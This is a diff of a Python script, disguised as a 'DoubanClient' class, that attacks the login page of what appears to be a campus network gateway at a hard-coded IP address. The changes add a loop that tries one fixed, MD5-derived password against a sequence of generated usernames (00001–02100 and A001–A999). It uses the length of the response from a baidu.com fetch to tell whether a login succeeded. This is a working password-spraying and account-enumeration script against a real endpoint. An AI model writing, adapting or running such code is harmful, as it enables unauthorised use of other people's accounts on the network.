@@ -10,7 +10,6 @@ class DoubanClient(object):
               type = '1',
               n = '100'):
         login_url = 'http://210.43.32.30/cgi-bin/do_login'
-
         response = self.session.get(login_url)
 
         data = {'username':username,
@@ -19,18 +18,44 @@ class DoubanClient(object):
                 'type':type,
                 'n':n}
         self.session.post(login_url,data=data,headers = self.headers)
-        re = requests.get('http://www.baidu.com')
+        re = requests.get('https://www.baidu.com/')
         re.encoding = 'utf-8'
         return (len(str(re.text)))
 if __name__ == '__main__':
     username = '01002'
-    password = 666666
+    password = 987654321
     password = hashlib.md5(str(password).encode('utf-8')).hexdigest()[8:-8]
     D  = DoubanClient()
-    userint = 1000
+    userint = 1
+    key = [1000,2000,3000,4000,5000,6000,7000,8000,9000]
     intstr = D.login(username,password)
-    while (intstr == 267):
+    flag = 0
+    while (intstr == 267 and userint <= 2100):
         userint = userint + 1
-        username = '0'+ str(userint)
+        if flag == 1:
+            if userint < 10:
+                username = '0000'+ str(userint)
+            elif userint < 100:
+                username = '000'+ str(userint)
+            elif userint < 1000:
+                username = '00'+ str(userint)
+            elif userint < 10000:
+                username = '0'+ str(userint)
+        if flag == 1 and userint == 2100:
+            flag = 0
+            userint = 1
+        if flag == 0:
+            if userint < 10:
+                username = 'A00'+ str(userint)
+            elif userint < 100:
+                username = 'A0'+ str(userint)
+            elif userint < 1000:
+                username = 'A'+ str(userint)
+            else:
+                userint = 2101
         intstr = D.login(username,password)
+        for i in key:
+            if userint == i:
+                print(i)
+        print(username)
     print(username)
